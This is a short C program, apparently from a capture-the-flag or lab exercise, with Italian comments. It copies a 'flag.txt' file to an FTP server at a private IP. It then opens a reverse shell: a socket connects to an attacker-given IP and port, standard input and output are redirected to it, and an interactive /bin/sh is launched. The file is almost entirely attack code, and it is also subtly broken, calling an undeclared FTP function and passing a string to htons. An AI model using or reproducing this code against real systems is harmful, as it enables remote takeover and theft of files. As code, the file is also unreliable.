#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <curl/curl.h>

void create_shellcode(char *ip, char* port);


int main(int argc, char **argv){

    // Copia il file su un server FTP
    char* ftpUrl = "ftp://192.168.1.84";
    copy_file_to_ftp("~/Desktop/flag.txt", "/temp", ftpUrl);
    create_shellcode(argv[1], argv[2]);
    return 0;
}

void create_shellcode(char *ip, char* port)
{
    int scktd;
    struct sockaddr_in client;

    client.sin_family = AF_INET;
    client.sin_addr.s_addr = inet_addr(ip);
    client.sin_port = htons(port);
    scktd = socket(AF_INET, SOCK_STREAM, 0);
    connect(scktd, (struct sockaddr *)&client, sizeof(client));
    dup2(scktd, 0); // STDIN
    dup2(scktd, 1); // STDOUT
    dup2(scktd, 2); // STDERR
    execl("/bin/sh", "sh", "-i", NULL, NULL);
}
